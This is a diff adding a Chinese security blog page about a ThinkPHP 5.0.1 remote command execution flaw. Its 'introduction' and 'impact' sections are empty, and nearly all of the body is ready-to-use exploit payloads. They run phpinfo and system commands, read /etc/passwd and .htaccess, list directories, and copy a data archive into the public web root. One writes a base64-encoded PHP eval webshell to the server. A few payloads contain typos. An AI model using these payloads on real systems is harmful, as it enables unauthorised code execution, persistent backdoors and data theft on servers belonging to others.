@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Thinkphp 5.0.1一、漏洞简介二、漏洞影响三、复现过程1、判断是否存在漏洞poc1http:&#x2F;&#x2F;wwww.com&#x2F;public  s&#x3D;phpinfo()&amp;_method&#x3D;__construct&amp;filter&#x3D;assert _method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;server[]&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%205.x%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.1/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Thinkphp 5.0.1一、漏洞简介二、漏洞影响三、复现过程1、判断是否存在漏洞poc1http:&#x2F;&#x2F;wwww.com&#x2F;public  s&#x3D;phpinfo()&amp;_method&#x3D;__construct&amp;filter&#x3D;assert _method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;server[]&#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:04.574Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%205.x%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.1/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.574Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-5-0-1"><a href="#Thinkphp-5-0-1" class="headerlink" title="Thinkphp 5.0.1"></a>Thinkphp 5.0.1</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、判断是否存在漏洞"><a href="#1、判断是否存在漏洞" class="headerlink" title="1、判断是否存在漏洞"></a>1、判断是否存在漏洞</h3><h4 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h4><pre><code>http://wwww.com/public
+
+s=phpinfo()&amp;_method=__construct&amp;filter=assert
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1
+</code></pre>
+<h4 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h4><pre><code>http:/xxxx.com/?s=index/index/index
+
+s=ipconfig&amp;_mehthod=__construct$method=&amp;filter[]=system
+</code></pre>
+<h3 id="2、深入利用"><a href="#2、深入利用" class="headerlink" title="2、深入利用"></a>2、深入利用</h3><p>使用post提交</p>
+<h4 id="1、使用assert函数"><a href="#1、使用assert函数" class="headerlink" title="1、使用assert函数"></a>1、使用assert函数</h4><pre><code>s=phpinfo()&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<h4 id="2、include函数，可以根据此函数查看一些文件及其配置"><a href="#2、include函数，可以根据此函数查看一些文件及其配置" class="headerlink" title="2、include函数，可以根据此函数查看一些文件及其配置"></a>2、include函数，可以根据此函数查看一些文件及其配置</h4><pre><code>s=include(&quot;/etc/passwd&quot;)&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<h4 id="3、file-put-contents函数，可以直接写入文件"><a href="#3、file-put-contents函数，可以直接写入文件" class="headerlink" title="3、file_put_contents函数，可以直接写入文件"></a>3、file_put_contents函数，可以直接写入文件</h4><pre><code>s=file_put_contents(&#39;/data/wwwroot/www.0-sec.org/application/index/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<h4 id="4、读取文件"><a href="#4、读取文件" class="headerlink" title="4、读取文件"></a>4、读取文件</h4><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../application/.htaccess
+s=include(&quot;../application/.htaccess&quot;)&amp;_method=__construct&amp;filter=assert
+
+//ps:如果不加.. 请加上完整路径
+</code></pre>
+<h4 id="5、var-dump函数，可以查看该路径下的文件，文件夹"><a href="#5、var-dump函数，可以查看该路径下的文件，文件夹" class="headerlink" title="5、var_dump函数，可以查看该路径下的文件，文件夹"></a>5、var_dump函数，可以查看该路径下的文件，文件夹</h4><pre><code>s=var_dump(scandir(&#39;../application/&#39;))&amp;_method=__construct&amp;filter=assert
+</code></pre>
+<h4 id="6、复制文件"><a href="#6、复制文件" class="headerlink" title="6、复制文件"></a>6、复制文件</h4><pre><code>s=copy(&quot;/data/wwwroot/data.tar&quot;, &quot;/data/wwwroot/www.0-sec.org/public/data.tar&quot;)&amp;_method=__construct&amp;filter=asser
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%205.x%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.1/" data-id="cl5c2qwh900hoy8v18xmm36yo" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%205.x%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.10/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.x_order%20by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
